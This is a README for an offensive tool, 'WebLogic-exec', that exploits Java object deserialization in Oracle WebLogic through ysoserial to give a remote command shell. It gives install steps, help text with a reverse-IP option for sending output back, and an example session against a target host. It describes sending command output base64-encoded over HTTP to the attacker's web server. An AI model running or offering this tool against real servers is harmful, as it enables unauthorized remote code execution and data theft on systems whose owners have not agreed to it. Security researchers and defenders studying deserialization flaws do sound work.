# WebLogic-exec
WebLogic serialized object command execution

full credit and details at the following link:

https://github.com/frohoff/ysoserial

http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/

this script lets you execute commands like in a shell, exploiting java object deserialization vulnerability.
commands output is saved into temporary file in target server, base64 encoded, splitted and sent through http request to python web server, where it is decoded and displayed.

ysoserial is required; the latest jar file could be downloaded from JitPack.

## Installation
```shell
git clone https://github.com/9andrea1/WebLogic-exec
cd WebLogic-exec
wget https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
mv ysoserial-master-SNAPSHOT.jar ysoserial.jar
```

## Help
```shell
root@kali:~/Desktop/WebLogic-exec# python cmd_shell.py -h

Usage: cmd_shell.py [options]

Serialized objects command execution

Options:
  -h, --help            show this help message and exit
  -t TARGET, --target=TARGET
                        target ip
  -p PORT, --port=PORT  target port
  -r REVERSE, --reverse=REVERSE
                        cmd exec reverse ip (default my ip) 
```

## Example
```shell
root@kali:~/Desktop/WebLogic-exec# python cmd_shell.py -t 192.168.1.106 -p 8180

$> pwd
/var/www/html/

$> exit
Bye!
```
